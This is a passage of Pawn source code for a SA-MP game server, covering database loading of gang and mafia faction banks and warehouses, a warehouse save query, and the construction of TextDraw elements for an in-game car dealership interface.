		DrugsBank[TEAM_OPG1] = cache_get_row_int(0, 4, dbHandle); // lcndrugs
		DrugsBank[TEAM_YAK] = cache_get_row_int(0, 5, dbHandle); // rmdrugs
	    MafiaPatr[0] = cache_get_row_int(0, 6, dbHandle); // lcnpat
		MafiaPatr[1] = cache_get_row_int(0, 7, dbHandle); // yakpat
		MafiaPatr[2] = cache_get_row_int(0, 8, dbHandle); // rmpat
		MafiaEd[0] = cache_get_row_int(0, 9, dbHandle); // lcned
		MafiaEd[1] = cache_get_row_int(0, 10, dbHandle); // yaked
		MafiaEd[2] = cache_get_row_int(0, 11, dbHandle); // rmed
		b_Sklad{5} = cache_get_row_int(0, 12, dbHandle); // bskl_l
		b_Sklad{6} = cache_get_row_int(0, 13, dbHandle); // bskl_y
		b_Sklad{7} = cache_get_row_int(0, 14, dbHandle); // bskl_r
    }
	printf("[Загружены склады мафий]: Потрачено: <%i ms>.", GetTickCount() - time);
	return 1;
}

forward LoadGang();
public LoadGang()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
	    FracBank[0] = cache_get_row_int(0, 0, dbHandle); // grovebank
		FracBank[1] = cache_get_row_int(0, 1, dbHandle); // ballasbank
		FracBank[2] = cache_get_row_int(0, 2, dbHandle); // rifabank
		FracBank[3] = cache_get_row_int(0, 3, dbHandle); // aztecbank
		FracBank[4] = cache_get_row_int(0, 4, dbHandle); // vagosbank
		DrugsBank[TEAM_GROOVE] = cache_get_row_int(0, 5, dbHandle); // grovedrugs
		DrugsBank[TEAM_BALLAS] = cache_get_row_int(0, 6, dbHandle); // ballasdrugs
		DrugsBank[TEAM_RIFA] = cache_get_row_int(0, 7, dbHandle); // rifadrugs
		DrugsBank[TEAM_OPGTEST2] = cache_get_row_int(0, 8, dbHandle); // aztecdrugs
		DrugsBank[TEAM_VAGOS] = cache_get_row_int(0, 9, dbHandle); // vagosdrugs
	    GangPatr[0] = cache_get_row_int(0, 10, dbHandle); // grovepat
		GangPatr[1] = cache_get_row_int(0, 11, dbHandle); // ballaspat
		GangPatr[2] = cache_get_row_int(0, 12, dbHandle); // rifapat
		GangPatr[3] = cache_get_row_int(0, 13, dbHandle); // aztecpat
		GangPatr[4] = cache_get_row_int(0, 14, dbHandle); // vagospat
		GangEd[0] = cache_get_row_int(0, 15, dbHandle); // groveed
		GangEd[1] = cache_get_row_int(0, 16, dbHandle); // ballased
		GangEd[2] = cache_get_row_int(0, 17, dbHandle); // rifaed
		GangEd[3] = cache_get_row_int(0, 18, dbHandle); // azteced
		GangEd[4] = cache_get_row_int(0, 19, dbHandle); // vagosed
		b_Capture{0} = cache_get_row_int(0, 20, dbHandle); // bcapt_g
		b_Capture{1} = cache_get_row_int(0, 21, dbHandle); // bcapt_b
		b_Capture{2} = cache_get_row_int(0, 22, dbHandle); // bcapt_r
		b_Capture{3} = cache_get_row_int(0, 23, dbHandle); // bcapt_a
		b_Capture{4} = cache_get_row_int(0, 24, dbHandle); // bcapt_v
		b_Sklad{0} = cache_get_row_int(0, 25, dbHandle); // bskl_g
		b_Sklad{1} = cache_get_row_int(0, 26, dbHandle); // bskl_b
		b_Sklad{2} = cache_get_row_int(0, 27, dbHandle); // bskl_r
		b_Sklad{3} = cache_get_row_int(0, 28, dbHandle); // bskl_a
		b_Sklad{4} = cache_get_row_int(0, 29, dbHandle); // bskl_v
    }
	printf("[Загружены склады банд]: Потрачено: <%i ms>.", GetTickCount() - time);
	return 1;
}

forward LoadOther();
public LoadOther()
{
	new time = GetTickCount(), rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
		FracBank[8] = cache_get_row_int(0, 0, dbHandle); // lsnbank
		FracBank[9] = cache_get_row_int(0, 1, dbHandle); // sfnbank
		FracBank[10] = cache_get_row_int(0, 2, dbHandle); // lvnbank
		cache_get_row(0, 3, NewsPrice, dbHandle, 40); // newsprice
		sscanf(NewsPrice, "p<,>iiiiii", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
		cache_get_row(0, 4, JobPrice, dbHandle, 40); // jobprice
		sscanf(JobPrice, "p<,>iiiiii", ShPrice[0], ShPrice[1], LesPrice[0], LesPrice[1], OzPrice[0], OzPrice[1]);
		cache_get_row(0, 5, MerPanel, dbHandle, 40); // jobprice
		sscanf(MerPanel, "p<,>iiiiii", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
		cache_get_row(0, 6, MdPanel, dbHandle, 40); // MdPanel
		sscanf(MdPanel, "p<,>iiiiii", MD[0], MD[1], MD[2], MD[3], MD[4], MD[5]);
		Mineral = cache_get_row_int(0, 7, dbHandle); // mineral
		gGunWorkWH[0] = cache_get_row_int(0, 8, dbHandle); // guncoal
		gGunWorkWH[1] = cache_get_row_int(0, 9, dbHandle); // gunwood
		gGunWorkWH[2] = cache_get_row_int(0, 10, dbHandle); // gun
		Lessdrov = cache_get_row_int(0, 11, dbHandle); // drova
		gArmyWarehouse[0] = cache_get_row_int(0, 12, dbHandle); // armygun
		gArmyWarehouse[1] = cache_get_row_int(0, 13, dbHandle); // armyammo
		doubling_exp = cache_get_row_int(0, 14, dbHandle); // d_exp
		doubling_donate = cache_get_row_int(0, 15, dbHandle); // d_donate
		doubling_job = cache_get_row_int(0, 16, dbHandle); // d_jobik
    }
	printf("[Загружено остальное]: Потрачено: <%i ms>.",GetTickCount() - time);
	return 1;
}

stock SaveWarehouse()
{
    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_OTHER" SET armygun=%d,armyammo=%d,mineral=%d,guncoal=%d,gunwood=%d,gun=%d,drova=%d", gArmyWarehouse[0], gArmyWarehouse[1], Mineral, gGunWorkWH[0], gGunWorkWH[1], gGunWorkWH[2], Lessdrov);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}

stock LoadTextDrawsSkill()
{
	autosalon_global_td[0] = TextDrawCreate(508.800476, 157.449829, "box");
	TextDrawLetterSize(autosalon_global_td[0], 0.000000, 14.213913);
	TextDrawTextSize(autosalon_global_td[0], 632.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[0], 1);
	TextDrawColor(autosalon_global_td[0], -1);
	TextDrawUseBox(autosalon_global_td[0], 1);
	TextDrawBoxColor(autosalon_global_td[0], 419954943);
	TextDrawSetShadow(autosalon_global_td[0], 0);
	TextDrawSetOutline(autosalon_global_td[0], 0);
	TextDrawBackgroundColor(autosalon_global_td[0], 255);
	TextDrawFont(autosalon_global_td[0], 1);
	TextDrawSetProportional(autosalon_global_td[0], 1);
	TextDrawSetShadow(autosalon_global_td[0], 0);

	autosalon_global_td[1] = TextDrawCreate(508.699798, 143.312347, "box");
	TextDrawLetterSize(autosalon_global_td[1], 0.000000, 1.199998);
	TextDrawTextSize(autosalon_global_td[1], 631.613525, 0.000000);
	TextDrawAlignment(autosalon_global_td[1], 1);
	TextDrawColor(autosalon_global_td[1], -1);
	TextDrawUseBox(autosalon_global_td[1], 1);
	TextDrawBoxColor(autosalon_global_td[1], -1315897089);
	TextDrawSetShadow(autosalon_global_td[1], 0);
	TextDrawSetOutline(autosalon_global_td[1], 0);
	TextDrawBackgroundColor(autosalon_global_td[1], 255);
	TextDrawFont(autosalon_global_td[1], 1);
	TextDrawSetProportional(autosalon_global_td[1], 1);
	TextDrawSetShadow(autosalon_global_td[1], 0);

	autosalon_global_td[2] = TextDrawCreate(508.699798, 150.212768, "box");
	TextDrawLetterSize(autosalon_global_td[2], 0.000000, 0.499998);
	TextDrawTextSize(autosalon_global_td[2], 631.750732, 0.000000);
	TextDrawAlignment(autosalon_global_td[2], 1);
	TextDrawColor(autosalon_global_td[2], -1);
	TextDrawUseBox(autosalon_global_td[2], 1);
	TextDrawBoxColor(autosalon_global_td[2], 50);
	TextDrawSetShadow(autosalon_global_td[2], 0);
	TextDrawSetOutline(autosalon_global_td[2], 0);
	TextDrawBackgroundColor(autosalon_global_td[2], 255);
	TextDrawFont(autosalon_global_td[2], 1);
	TextDrawSetProportional(autosalon_global_td[2], 1);
	TextDrawSetShadow(autosalon_global_td[2], 0);

	autosalon_global_td[3] = TextDrawCreate(568.200073, 143.187500, "автосалон");
	TextDrawLetterSize(autosalon_global_td[3], 0.198999, 0.945625);
	TextDrawAlignment(autosalon_global_td[3], 2);
	TextDrawColor(autosalon_global_td[3], -1);
	TextDrawSetShadow(autosalon_global_td[3], 0);
	TextDrawSetOutline(autosalon_global_td[3], 0);
	TextDrawBackgroundColor(autosalon_global_td[3], 255);
	TextDrawFont(autosalon_global_td[3], 2);
	TextDrawSetProportional(autosalon_global_td[3], 1);
	TextDrawSetShadow(autosalon_global_td[3], 0);

	autosalon_global_td[4] = TextDrawCreate(509.600097, 161.562500, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[4], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[4], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[4], 1);
	TextDrawColor(autosalon_global_td[4], -1315897089);
	TextDrawSetShadow(autosalon_global_td[4], 0);
	TextDrawSetOutline(autosalon_global_td[4], 0);
	TextDrawBackgroundColor(autosalon_global_td[4], 255);
	TextDrawFont(autosalon_global_td[4], 4);
	TextDrawSetProportional(autosalon_global_td[4], 0);
	TextDrawSetShadow(autosalon_global_td[4], 0);

	autosalon_global_td[5] = TextDrawCreate(606.877075, 161.562500, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[5], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[5], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[5], 1);
	TextDrawColor(autosalon_global_td[5], -1315897089);
	TextDrawSetShadow(autosalon_global_td[5], 0);
	TextDrawSetOutline(autosalon_global_td[5], 0);
	TextDrawBackgroundColor(autosalon_global_td[5], 255);
	TextDrawFont(autosalon_global_td[5], 4);
	TextDrawSetProportional(autosalon_global_td[5], 0);
	TextDrawSetShadow(autosalon_global_td[5], 0);

	autosalon_global_td[6] = TextDrawCreate(523.199829, 163.849792, "box");
	TextDrawLetterSize(autosalon_global_td[6], 0.000000, 1.793001);
	TextDrawTextSize(autosalon_global_td[6], 617.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[6], 1);
	TextDrawColor(autosalon_global_td[6], -1);
	TextDrawUseBox(autosalon_global_td[6], 1);
	TextDrawBoxColor(autosalon_global_td[6], -1315897089);
	TextDrawSetShadow(autosalon_global_td[6], 0);
	TextDrawSetOutline(autosalon_global_td[6], 0);
	TextDrawBackgroundColor(autosalon_global_td[6], 255);
	TextDrawFont(autosalon_global_td[6], 1);
	TextDrawSetProportional(autosalon_global_td[6], 1);
	TextDrawSetShadow(autosalon_global_td[6], 0);

	autosalon_global_td[7] = TextDrawCreate(511.700225, 163.137542, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[7], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[7], 21.169935, 17.559967);
	TextDrawAlignment(autosalon_global_td[7], 1);
	TextDrawColor(autosalon_global_td[7], 419954943);
	TextDrawSetShadow(autosalon_global_td[7], 0);
	TextDrawSetOutline(autosalon_global_td[7], 0);
	TextDrawBackgroundColor(autosalon_global_td[7], 255);
	TextDrawFont(autosalon_global_td[7], 4);
	TextDrawSetProportional(autosalon_global_td[7], 0);
	TextDrawSetShadow(autosalon_global_td[7], 0);

	autosalon_global_td[8] = TextDrawCreate(607.797485, 163.249969, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[8], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[8], 21.169935, 17.589967);
	TextDrawAlignment(autosalon_global_td[8], 1);
	TextDrawColor(autosalon_global_td[8], 419954943);
	TextDrawSetShadow(autosalon_global_td[8], 0);
	TextDrawSetOutline(autosalon_global_td[8], 0);
	TextDrawBackgroundColor(autosalon_global_td[8], 255);
	TextDrawFont(autosalon_global_td[8], 4);
	TextDrawSetProportional(autosalon_global_td[8], 0);
	TextDrawSetShadow(autosalon_global_td[8], 0);

	autosalon_global_td[9] = TextDrawCreate(525.800476, 165.212188, "box");
	TextDrawLetterSize(autosalon_global_td[9], 0.000000, 1.522001);
	TextDrawTextSize(autosalon_global_td[9], 617.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[9], 1);
	TextDrawColor(autosalon_global_td[9], -1);
	TextDrawUseBox(autosalon_global_td[9], 1);
	TextDrawBoxColor(autosalon_global_td[9], 419954943);
	TextDrawSetShadow(autosalon_global_td[9], 0);
	TextDrawSetOutline(autosalon_global_td[9], 0);
	TextDrawBackgroundColor(autosalon_global_td[9], 255);
	TextDrawFont(autosalon_global_td[9], 1);
	TextDrawSetProportional(autosalon_global_td[9], 1);
	TextDrawSetShadow(autosalon_global_td[9], 0);

	autosalon_global_td[10] = TextDrawCreate(509.600097, 187.064056, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[10], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[10], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[10], 1);
	TextDrawColor(autosalon_global_td[10], -1315897089);
	TextDrawSetShadow(autosalon_global_td[10], 0);
	TextDrawSetOutline(autosalon_global_td[10], 0);
	TextDrawBackgroundColor(autosalon_global_td[10], 255);
	TextDrawFont(autosalon_global_td[10], 4);
	TextDrawSetProportional(autosalon_global_td[10], 0);
	TextDrawSetShadow(autosalon_global_td[10], 0);

	autosalon_global_td[11] = TextDrawCreate(606.877075, 187.464080, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[11], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[11], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[11], 1);
	TextDrawColor(autosalon_global_td[11], -1315897089);
	TextDrawSetShadow(autosalon_global_td[11], 0);
	TextDrawSetOutline(autosalon_global_td[11], 0);
	TextDrawBackgroundColor(autosalon_global_td[11], 255);
	TextDrawFont(autosalon_global_td[11], 4);
	TextDrawSetProportional(autosalon_global_td[11], 0);
	TextDrawSetShadow(autosalon_global_td[11], 0);

	autosalon_global_td[12] = TextDrawCreate(511.300292, 188.762664, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[12], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[12], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[12], 1);
	TextDrawColor(autosalon_global_td[12], 419954943);
	TextDrawSetShadow(autosalon_global_td[12], 0);
	TextDrawSetOutline(autosalon_global_td[12], 0);
	TextDrawBackgroundColor(autosalon_global_td[12], 255);
	TextDrawFont(autosalon_global_td[12], 4);
	TextDrawSetProportional(autosalon_global_td[12], 0);
	TextDrawSetShadow(autosalon_global_td[12], 0);

	autosalon_global_td[13] = TextDrawCreate(608.700439, 189.175323, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[13], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[13], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[13], 1);
	TextDrawColor(autosalon_global_td[13], 419954943);
	TextDrawSetShadow(autosalon_global_td[13], 0);
	TextDrawSetOutline(autosalon_global_td[13], 0);
	TextDrawBackgroundColor(autosalon_global_td[13], 255);
	TextDrawFont(autosalon_global_td[13], 4);
	TextDrawSetProportional(autosalon_global_td[13], 0);
	TextDrawSetShadow(autosalon_global_td[13], 0);

	autosalon_global_td[14] = TextDrawCreate(535.795288, 187.099822, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[14], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[14], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[14], 1);
	TextDrawColor(autosalon_global_td[14], -1315897089);
	TextDrawSetShadow(autosalon_global_td[14], 0);
	TextDrawSetOutline(autosalon_global_td[14], 0);
	TextDrawBackgroundColor(autosalon_global_td[14], 255);
	TextDrawFont(autosalon_global_td[14], 4);
	TextDrawSetProportional(autosalon_global_td[14], 0);
	TextDrawSetShadow(autosalon_global_td[14], 0);

	autosalon_global_td[15] = TextDrawCreate(580.684326, 187.099822, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[15], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[15], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[15], 1);
	TextDrawColor(autosalon_global_td[15], -1315897089);
	TextDrawSetShadow(autosalon_global_td[15], 0);
	TextDrawSetOutline(autosalon_global_td[15], 0);
	TextDrawBackgroundColor(autosalon_global_td[15], 255);
	TextDrawFont(autosalon_global_td[15], 4);
	TextDrawSetProportional(autosalon_global_td[15], 0);
	TextDrawSetShadow(autosalon_global_td[15], 0);

	autosalon_global_td[16] = TextDrawCreate(549.699829, 189.262481, "box");
	TextDrawLetterSize(autosalon_global_td[16], 0.000000, 1.854997);
	TextDrawTextSize(autosalon_global_td[16], 592.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[16], 1);
	TextDrawColor(autosalon_global_td[16], -1);
	TextDrawUseBox(autosalon_global_td[16], 1);
	TextDrawBoxColor(autosalon_global_td[16], -1315897089);
	TextDrawSetShadow(autosalon_global_td[16], 0);
	TextDrawSetOutline(autosalon_global_td[16], 0);
	TextDrawBackgroundColor(autosalon_global_td[16], 255);
	TextDrawFont(autosalon_global_td[16], 1);
	TextDrawSetProportional(autosalon_global_td[16], 1);
	TextDrawSetShadow(autosalon_global_td[16], 0);

	autosalon_global_td[17] = TextDrawCreate(537.900146, 188.887725, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[17], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[17], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[17], 1);
	TextDrawColor(autosalon_global_td[17], 419954943);
	TextDrawSetShadow(autosalon_global_td[17], 0);
	TextDrawSetOutline(autosalon_global_td[17], 0);
	TextDrawBackgroundColor(autosalon_global_td[17], 255);
	TextDrawFont(autosalon_global_td[17], 4);
	TextDrawSetProportional(autosalon_global_td[17], 0);
	TextDrawSetShadow(autosalon_global_td[17], 0);

	autosalon_global_td[18] = TextDrawCreate(582.189331, 188.887725, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[18], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[18], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[18], 1);
	TextDrawColor(autosalon_global_td[18], 419954943);
	TextDrawSetShadow(autosalon_global_td[18], 0);
	TextDrawSetOutline(autosalon_global_td[18], 0);
	TextDrawBackgroundColor(autosalon_global_td[18], 255);
	TextDrawFont(autosalon_global_td[18], 4);
	TextDrawSetProportional(autosalon_global_td[18], 0);
	TextDrawSetShadow(autosalon_global_td[18], 0);

	autosalon_global_td[19] = TextDrawCreate(548.800476, 190.612243, "box");
	TextDrawLetterSize(autosalon_global_td[19], 0.000000, 1.554991);
	TextDrawTextSize(autosalon_global_td[19], 591.120117, 0.000000);
	TextDrawAlignment(autosalon_global_td[19], 1);
	TextDrawColor(autosalon_global_td[19], -1);
	TextDrawUseBox(autosalon_global_td[19], 1);
	TextDrawBoxColor(autosalon_global_td[19], 419954943);
	TextDrawSetShadow(autosalon_global_td[19], 0);
	TextDrawSetOutline(autosalon_global_td[19], 0);
	TextDrawBackgroundColor(autosalon_global_td[19], 255);
	TextDrawFont(autosalon_global_td[19], 1);
	TextDrawSetProportional(autosalon_global_td[19], 1);
	TextDrawSetShadow(autosalon_global_td[19], 0);

	autosalon_global_td[20] = TextDrawCreate(521.299804, 191.874847, "<");
	TextDrawLetterSize(autosalon_global_td[20], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[20], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[20], 2);
	TextDrawColor(autosalon_global_td[20], -1);
	TextDrawUseBox(autosalon_global_td[20], 1);
	TextDrawBoxColor(autosalon_global_td[20], 0);
	TextDrawSetShadow(autosalon_global_td[20], 0);
	TextDrawSetOutline(autosalon_global_td[20], 0);
	TextDrawBackgroundColor(autosalon_global_td[20], 255);
	TextDrawFont(autosalon_global_td[20], 2);
	TextDrawSetProportional(autosalon_global_td[20], 1);
	TextDrawSetShadow(autosalon_global_td[20], 0);
	TextDrawSetSelectable(autosalon_global_td[20], true);

	autosalon_global_td[21] = TextDrawCreate(620.475585, 191.874847, ">");
	TextDrawLetterSize(autosalon_global_td[21], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[21], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[21], 2);
	TextDrawColor(autosalon_global_td[21], -1);
	TextDrawUseBox(autosalon_global_td[21], 1);
	TextDrawBoxColor(autosalon_global_td[21], 0);
	TextDrawSetShadow(autosalon_global_td[21], 0);
	TextDrawSetOutline(autosalon_global_td[21], 0);
	TextDrawBackgroundColor(autosalon_global_td[21], 255);
	TextDrawFont(autosalon_global_td[21], 2);
	TextDrawSetProportional(autosalon_global_td[21], 1);
	TextDrawSetShadow(autosalon_global_td[21], 0);
	TextDrawSetSelectable(autosalon_global_td[21], true);

	autosalon_global_td[22] = TextDrawCreate(509.600097, 212.765625, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[22], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[22], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[22], 1);
	TextDrawColor(autosalon_global_td[22], -1315897089);
	TextDrawSetShadow(autosalon_global_td[22], 0);
	TextDrawSetOutline(autosalon_global_td[22], 0);
	TextDrawBackgroundColor(autosalon_global_td[22], 255);
	TextDrawFont(autosalon_global_td[22], 4);
	TextDrawSetProportional(autosalon_global_td[22], 0);
	TextDrawSetShadow(autosalon_global_td[22], 0);

	autosalon_global_td[23] = TextDrawCreate(606.877075, 213.165649, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[23], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[23], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[23], 1);
	TextDrawColor(autosalon_global_td[23], -1315897089);
	TextDrawSetShadow(autosalon_global_td[23], 0);
	TextDrawSetOutline(autosalon_global_td[23], 0);
	TextDrawBackgroundColor(autosalon_global_td[23], 255);
	TextDrawFont(autosalon_global_td[23], 4);
	TextDrawSetProportional(autosalon_global_td[23], 0);
	TextDrawSetShadow(autosalon_global_td[23], 0);

	autosalon_global_td[24] = TextDrawCreate(511.300292, 214.464233, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[24], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[24], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[24], 1);
	TextDrawColor(autosalon_global_td[24], 419954943);
	TextDrawSetShadow(autosalon_global_td[24], 0);
	TextDrawSetOutline(autosalon_global_td[24], 0);
	TextDrawBackgroundColor(autosalon_global_td[24], 255);
	TextDrawFont(autosalon_global_td[24], 4);
	TextDrawSetProportional(autosalon_global_td[24], 0);
	TextDrawSetShadow(autosalon_global_td[24], 0);

	autosalon_global_td[25] = TextDrawCreate(608.700439, 214.876892, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[25], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[25], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[25], 1);
	TextDrawColor(autosalon_global_td[25], 419954943);
	TextDrawSetShadow(autosalon_global_td[25], 0);
	TextDrawSetOutline(autosalon_global_td[25], 0);
	TextDrawBackgroundColor(autosalon_global_td[25], 255);
	TextDrawFont(autosalon_global_td[25], 4);
	TextDrawSetProportional(autosalon_global_td[25], 0);
	TextDrawSetShadow(autosalon_global_td[25], 0);

	autosalon_global_td[26] = TextDrawCreate(535.795288, 212.801391, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[26], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[26], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[26], 1);
	TextDrawColor(autosalon_global_td[26], -1315897089);
	TextDrawSetShadow(autosalon_global_td[26], 0);
	TextDrawSetOutline(autosalon_global_td[26], 0);
	TextDrawBackgroundColor(autosalon_global_td[26], 255);
	TextDrawFont(autosalon_global_td[26], 4);
	TextDrawSetProportional(autosalon_global_td[26], 0);
	TextDrawSetShadow(autosalon_global_td[26], 0);

	autosalon_global_td[27] = TextDrawCreate(580.684326, 212.801391, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[27], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[27], 24.000000, 21.000000);
	TextDrawAlignment(autosalon_global_td[27], 1);
	TextDrawColor(autosalon_global_td[27], -1315897089);
	TextDrawSetShadow(autosalon_global_td[27], 0);
	TextDrawSetOutline(autosalon_global_td[27], 0);
	TextDrawBackgroundColor(autosalon_global_td[27], 255);
	TextDrawFont(autosalon_global_td[27], 4);
	TextDrawSetProportional(autosalon_global_td[27], 0);
	TextDrawSetShadow(autosalon_global_td[27], 0);

	autosalon_global_td[28] = TextDrawCreate(549.699829, 214.964050, "box");
	TextDrawLetterSize(autosalon_global_td[28], 0.000000, 1.854997);
	TextDrawTextSize(autosalon_global_td[28], 592.000000, 0.000000);
	TextDrawAlignment(autosalon_global_td[28], 1);
	TextDrawColor(autosalon_global_td[28], -1);
	TextDrawUseBox(autosalon_global_td[28], 1);
	TextDrawBoxColor(autosalon_global_td[28], -1315897089);
	TextDrawSetShadow(autosalon_global_td[28], 0);
	TextDrawSetOutline(autosalon_global_td[28], 0);
	TextDrawBackgroundColor(autosalon_global_td[28], 255);
	TextDrawFont(autosalon_global_td[28], 1);
	TextDrawSetProportional(autosalon_global_td[28], 1);
	TextDrawSetShadow(autosalon_global_td[28], 0);

	autosalon_global_td[29] = TextDrawCreate(537.900146, 214.589294, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[29], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[29], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[29], 1);
	TextDrawColor(autosalon_global_td[29], 419954943);
	TextDrawSetShadow(autosalon_global_td[29], 0);
	TextDrawSetOutline(autosalon_global_td[29], 0);
	TextDrawBackgroundColor(autosalon_global_td[29], 255);
	TextDrawFont(autosalon_global_td[29], 4);
	TextDrawSetProportional(autosalon_global_td[29], 0);
	TextDrawSetShadow(autosalon_global_td[29], 0);

	autosalon_global_td[30] = TextDrawCreate(582.189331, 214.589294, "ld_pool:ball");
	TextDrawLetterSize(autosalon_global_td[30], 0.000000, 0.000000);
	TextDrawTextSize(autosalon_global_td[30], 20.439918, 17.559967);
	TextDrawAlignment(autosalon_global_td[30], 1);
	TextDrawColor(autosalon_global_td[30], 419954943);
	TextDrawSetShadow(autosalon_global_td[30], 0);
	TextDrawSetOutline(autosalon_global_td[30], 0);
	TextDrawBackgroundColor(autosalon_global_td[30], 255);
	TextDrawFont(autosalon_global_td[30], 4);
	TextDrawSetProportional(autosalon_global_td[30], 0);
	TextDrawSetShadow(autosalon_global_td[30], 0);

	autosalon_global_td[31] = TextDrawCreate(548.800476, 216.313812, "box");
	TextDrawLetterSize(autosalon_global_td[31], 0.000000, 1.554991);
	TextDrawTextSize(autosalon_global_td[31], 591.120117, 0.000000);
	TextDrawAlignment(autosalon_global_td[31], 1);
	TextDrawColor(autosalon_global_td[31], -1);
	TextDrawUseBox(autosalon_global_td[31], 1);
	TextDrawBoxColor(autosalon_global_td[31], 419954943);
	TextDrawSetShadow(autosalon_global_td[31], 0);
	TextDrawSetOutline(autosalon_global_td[31], 0);
	TextDrawBackgroundColor(autosalon_global_td[31], 255);
	TextDrawFont(autosalon_global_td[31], 1);
	TextDrawSetProportional(autosalon_global_td[31], 1);
	TextDrawSetShadow(autosalon_global_td[31], 0);

	autosalon_global_td[32] = TextDrawCreate(521.299804, 217.576416, "<");
	TextDrawLetterSize(autosalon_global_td[32], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[32], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[32], 2);
	TextDrawColor(autosalon_global_td[32], -1);
	TextDrawUseBox(autosalon_global_td[32], 1);
	TextDrawBoxColor(autosalon_global_td[32], 0);
	TextDrawSetShadow(autosalon_global_td[32], 0);
	TextDrawSetOutline(autosalon_global_td[32], 0);
	TextDrawBackgroundColor(autosalon_global_td[32], 255);
	TextDrawFont(autosalon_global_td[32], 2);
	TextDrawSetProportional(autosalon_global_td[32], 1);
	TextDrawSetShadow(autosalon_global_td[32], 0);
	TextDrawSetSelectable(autosalon_global_td[32], true);

	autosalon_global_td[33] = TextDrawCreate(620.475585, 217.576416, ">");
	TextDrawLetterSize(autosalon_global_td[33], 0.257499, 1.225625);
	TextDrawTextSize(autosalon_global_td[33], 10.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[33], 2);
	TextDrawColor(autosalon_global_td[33], -1);
	TextDrawUseBox(autosalon_global_td[33], 1);
	TextDrawBoxColor(autosalon_global_td[33], 0);
	TextDrawSetShadow(autosalon_global_td[33], 0);
	TextDrawSetOutline(autosalon_global_td[33], 0);
	TextDrawBackgroundColor(autosalon_global_td[33], 255);
	TextDrawFont(autosalon_global_td[33], 2);
	TextDrawSetProportional(autosalon_global_td[33], 1);
	TextDrawSetShadow(autosalon_global_td[33], 0);
	TextDrawSetSelectable(autosalon_global_td[33], true);

	autosalon_global_td[34] = TextDrawCreate(570.875976, 218.376464, "цвет_основной");
	TextDrawLetterSize(autosalon_global_td[34], 0.174500, 0.965623);
	TextDrawTextSize(autosalon_global_td[34], 0.000000, 10.000000);
	TextDrawAlignment(autosalon_global_td[34], 2);
	TextDrawColor(autosalon_global_td[34], -1);
